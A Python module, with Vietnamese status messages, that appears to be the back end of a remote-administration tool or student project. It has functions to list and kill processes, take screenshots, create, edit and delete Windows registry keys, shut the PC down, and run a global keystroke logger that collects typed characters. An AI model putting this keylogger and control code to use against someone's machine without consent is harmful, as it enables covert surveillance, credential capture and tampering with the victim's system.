import psutil
import pyautogui
import cv2
import numpy as np
import os
from pynput.keyboard import Listener, Key
import logging
import winreg
import os



def get_hkey(HKEY_NAME):
    if HKEY_NAME == 'HKEY_LOCAL_MACHINE':
        return winreg.HKEY_LOCAL_MACHINE
    elif HKEY_NAME == 'HKEY_CLASSES_ROOT':
        return winreg.HKEY_CLASSES_ROOT
    elif HKEY_NAME == 'HKEY_CURRENT_USER':
        return winreg.HKEY_CURRENT_USER
    elif HKEY_NAME == 'HKEY_USERS':
        return winreg.HKEY_USERS
    else:
        return winreg.HKEY_CURRENT_CONFIG

def open_key(link):
    links = link.split("\\")

    HKEY_NAME = links.pop(0)

    HKEY = get_hkey(HKEY_NAME)

    aReg = winreg.ConnectRegistry(None, HKEY)

    aKey = "\\".join(links)

    return winreg.OpenKey(aReg, aKey, 0, winreg.KEY_ALL_ACCESS)


def get_process_running():
    application_running = []

    for proc in psutil.process_iter(['pid', 'name']):
        application_running.append(proc.info)

    return application_running


def kill_process_running(pid):
    p = psutil.Process(pid)
    p.kill()


def take_screen_shot():
    screen_shot = pyautogui.screenshot()
    screen_shot = cv2.cvtColor(np.array(screen_shot), cv2.COLOR_RGB2BGR)
    
    return screen_shot


def get_value(link, name):
    try:
        asubkey = open_key(link)
        return winreg.QueryValueEx(asubkey, name)[0]
    except Exception as e:
        print(e)
        return "Lỗi"

def delete_value(link, name):
    try:
        asubkey = open_key(link)
        winreg.DeleteValue(asubkey, name)
        return "Xóa value thành công"
    except Exception as e:
        print(e)
        return "Lỗi"

def set_value(link, name, value, value_type):
    if value_type == 'String':
        value_type = winreg.REG_SZ
    elif value_type == 'Binary':
        value_type = winreg.REG_BINARY
    elif value_type == 'DWORD':
        value_type = winreg.REG_DWORD
    elif value_type == 'QWORD':
        value_type = winreg.REG_QWORD
    elif value_type == 'Multi-String':
        value_type = winreg.REG_MULTI_SZ
    else:
        value_type = winreg.REG_EXPAND_SZ
    
    try:
        asubkey = open_key(link)

        winreg.SetValueEx(asubkey, name, 0, value_type, value)

        return "Sửa value thành công"
    except Exception as e:
        print(e)
        return "Lỗi"

def create_key(link):
    links = link.split("\\")

    HKEY_NAME = links.pop(0)

    HKEY = get_hkey(HKEY_NAME)

    aKey = "\\".join(links)

    try:
        winreg.CreateKey(HKEY, aKey)
        return "Tạo Key thành công"
    except Exception as e:
        print(e)
        return "Lỗi"

def delete_key(link):
    links = link.split("\\")

    HKEY_NAME = links.pop(0)

    HKEY = get_hkey(HKEY_NAME)

    aKey = "\\".join(links)

    try:
        winreg.DeleteKey(HKEY, aKey)
        return "Xóa Key thành công"
    except Exception as e:
        print(e)
        return "Lỗi"


key_log = ''
listener = None

def on_press(key):
    global key_log
    try:
        print('alphanumeric key {0} pressed'.format(
            key.char))
        key_log += key.char
    except AttributeError:
        pass

def listening_keyboard(listening=True):
    global key_log
    global listener

    if listening:
        listener = Listener(on_press=on_press)
        listener.start()
    else:
        if listener:
            listener.stop()
        key_log = ''

def get_key_log():
    global key_log

    return key_log

def shutdown_pc():
    os.system("shutdown /s /t 1")

